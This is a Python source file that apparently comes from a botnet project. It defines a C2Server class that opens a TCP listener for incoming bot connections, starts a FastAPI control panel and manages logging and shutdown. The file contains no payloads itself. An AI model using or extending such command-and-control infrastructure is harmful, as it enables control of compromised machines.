# backend/Core/Server.py

import asyncio
import multiprocessing
import webbrowser

from logs import Log as logger
from backend import IP, PORT, API_PORT
from backend.API import run_fastapi_server
from backend import start_benchmark
from .ClientConnection import BotConnectionHandler

class C2Server:
    """Управление запуском и остановкой всей инфраструктуры сервера"""

    def __init__(self):
        self.log_queue = multiprocessing.Queue()
        self.server = None

    async def start(self):
        """Запуск TCP сервера, API и фоновых задач"""
        # 1. Запуск TCP сервера для приема ботов
        handler = BotConnectionHandler()
        self.server = await asyncio.start_server(
            handler.handle_new_connection,
            IP, PORT,
            reuse_address=True,
            backlog=1000,
            limit=5242880  # 5 MB
        )

        addr = self.server.sockets[0].getsockname()
        logger.info(f"[+] TCP C2 Server: {addr}")

        # 2. Инициализация фоновых процессов
        log_task = asyncio.create_task(logger.start_queue_listener(self.log_queue))
        api_task = asyncio.create_task(run_fastapi_server(IP, API_PORT))
        
        start_benchmark(asyncio.get_running_loop(), interval=1)
        webbrowser.open(f"http://{IP}:{API_PORT}/")

        async with self.server:
            try:
                await asyncio.gather(self.server.serve_forever(), log_task, api_task)
            except asyncio.CancelledError:
                logger.info("[*] Shutdown initiated.")
            finally:
                await self._cleanup(api_task, log_task)

    async def _cleanup(self, api, logs):
        """Корректная остановка всех сервисов"""
        self.log_queue.put("STOP")
        api.cancel()
        await asyncio.gather(logs, api, return_exceptions=True)
        logger.info("[*] Server stopped.")

async def start_server():
    """Точка входа для запуска сервера"""
    instance = C2Server()
    await instance.start()